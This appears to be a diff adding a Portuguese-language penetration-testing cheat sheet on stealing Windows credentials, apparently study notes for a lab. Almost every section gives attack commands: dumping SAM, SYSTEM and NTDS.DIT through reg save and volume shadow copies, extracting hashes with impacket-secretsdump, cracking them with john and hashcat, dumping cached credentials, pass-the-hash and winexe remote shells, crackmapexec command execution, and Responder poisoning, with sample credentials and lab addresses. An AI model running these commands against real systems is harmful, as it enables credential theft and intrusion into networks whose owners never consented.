@@ -1,0 +1,166 @@
+================================================================================
+                            Hashes e Senhas - Windows
+================================================================================
+
+--------------------------------------------------------------------------------
+                            Arquivos
+--------------------------------------------------------------------------------
+
+SAM - (Security Account Manager)
+    Arquivo responsavel por armazenar as contas dos usuários.
+
+    %SystemRoot%/system32/config/sam
+
+NTDS.DIT - (Windows server/Active Directory)
+    Armazena dados do AD incluindo as contas de usuário.
+
+    %SystemRoot%/ntds/ntds.dit
+
+SYSTEM
+    Arquivo do sistema necessário para decriptar o SAM/NTDS.DIT
+
+    %SystemRoot%/system32/config/system
+
+* Os arquivos são bloqueados enquanto o sistema estiver em execução.
+
+--------------------------------------------------------------------------------
+                            Soluções
+--------------------------------------------------------------------------------
+
+Localmente
+    Realizar boot com liveCD e fazer a cópia dos arquivos.
+
+Remotamente
+    * C:\windows\repair\ (Apenas sistemas antigos como XP/2003)
+        * Os arquivos do diretório nem sempre estão atualizados.
+
+    * Salvar direto do registro do windows (Todas as versões)
+
+        reg save hklm\sam samOK
+
+    * Cópia sombra do volume (versões mais recentes)
+
+        vssadmin
+
+--------------------------------------------------------------------------------
+                    Sistemas antigos
+--------------------------------------------------------------------------------
+
+Arquivos de backup - (Podem não estar atualizados.)
+
+    c:\windows\repair\SAM
+    c:\windows\repair\SYSTEM
+
+Arquivos mais atualizados - (Necessário ser admin)
+
+    reg save hklm\sam samOK
+    reg save hklm\system systemOK
+
+Obtendo as hashes dos arquivos:
+
+    # samdump2 systemOK samOK
+
+    ou
+
+    # impacket-secretsdump -sam samOK -system systemOK LOCAL
+
+--------------------------------------------------------------------------------
+                    Obtendo hashes em Servidores AD (Active Directory)
+--------------------------------------------------------------------------------
+
+Arquivo responsavel por armazenar as informações do AD.
+
+    c:\windows\NTDS\ntds.dit (arquivo protegido)
+
+Listando volumes:
+
+    vssadmin list volumes
+
+Fazendo cópia dos volumes:
+
+    vssadmin create shadow /for=c:
+
+    copy <nome do volume>\windows\ntds\ntds.dit c:\copia-ntds.dit
+    copy <nome do volume>\windows\system32\config\system c:\copia-system
+
+    # impacket-secretdump -ntds copia-ntds -system copia-system LOCAL
+
+--------------------------------------------------------------------------------
+                    Descobrindo Hashes
+--------------------------------------------------------------------------------
+
+Descobrindo hash LM
+
+    # john --format=lm file-hashlm --show
+
+Descobrindo hash NTLM
+
+    # john --format=nt file-hashntlm --show
+
+--------------------------------------------------------------------------------
+                    Obtendo Hashes e Senhas em cache
+--------------------------------------------------------------------------------
+
+Usando o fgdump
+
+    fgdump.exe
+    (É gerado dos arquivos, 127.0.0.1.cachedump e 127.0.0.1.pwdump)
+
+Usando o WCE
+
+    wce-universal.exe -w
+
+--------------------------------------------------------------------------------
+                    Obtendo Hashes remotamente
+--------------------------------------------------------------------------------
+
+Usando o impacket
+
+    impacket-secretdump rogerio:Roger@10@172.16.1.60
+
+--------------------------------------------------------------------------------
+                    Obtendo shell no host
+--------------------------------------------------------------------------------
+
+Usando winexe
+
+    winexe -U rogerio%Roger@10 //172.16.1.60 cmd.exe
+
+--------------------------------------------------------------------------------
+                    Pass the Hash
+--------------------------------------------------------------------------------
+
+Se autenticando com o hash:
+
+    # pth-winexe -U rogerio%hashLM:hashNTLM //172.16.1.60 cmd.exe
+
+--------------------------------------------------------------------------------
+                Swiss Army Knife para Pentest
+--------------------------------------------------------------------------------
+
+Fazendo mapeamento da rede.
+ex:
+    # crackmapexec smb 172.16.1.0/24
+
+    # crackmapexec smb 172.16.1.0/24 -u rogerio -p Roger@10
+
+    # crackmapexec smb 172.16.1.0/24 -u rogerio -p Roger@10 -x 'whoemi'
+
+
+--------------------------------------------------------------------------------
+                    Ataque: NBT-NS / LLMNR
+--------------------------------------------------------------------------------
+
+NBT-NS  (NetBIOS Name Service)
+LLMNR   (Link-Local Multicast Name Resolution)
+mDNS    (Multicast Domain Name System)
+
+Capturando hashs da rede:
+
+    # reponder -I eth0 -Prv
+
+Quebrando hash capturado.
+
+    # hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force --show
+
+    # john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
